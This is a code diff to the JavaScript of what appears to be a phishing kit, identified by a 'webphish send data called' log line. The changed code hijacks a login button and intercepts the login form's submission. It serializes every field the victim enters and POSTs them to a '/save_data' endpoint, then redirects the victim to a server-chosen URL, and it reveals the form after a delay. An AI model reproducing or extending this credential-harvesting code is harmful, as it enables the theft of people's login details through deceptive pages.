@@ -1,8 +1,21 @@
 
-$(btn_id).prop('type', 'button')// set login button type button
-$(btn_id).attr("onclick", "getdata()")// set login button type button
 
+$(document).ready(function () {
+    $(btn_id).prop('type', 'button')// set login button type button
+    $(btn_id).attr("onclick", "getdata()")// set login button type button
 
+    console.log("page loaded")
+
+    $(form_id).submit(function (e) {
+        e.preventDefault();
+        data = $(form_id).serializeArray()  
+        send_data(data)
+    });
+
+    setTimeout(function () {
+        $(form_id).attr("class", "")
+    }, 10000);
+});
 
 
 function getdata() {
@@ -16,14 +29,8 @@ function getdata() {
 
 }
 
-$(form_id).submit(function (e) {
-    e.preventDefault();
-    data = $(form_id).serializeArray()
-    send_data(data)
-});
-
-
 function send_data(data) {
+    console.log("webphish send data called : )")
     $.ajax({
         url: "/save_data",
         type: "POST",
@@ -33,6 +40,6 @@ function send_data(data) {
             console.log(response)
             window.location.href = response["status"];
         },
-       
+
     });
 }
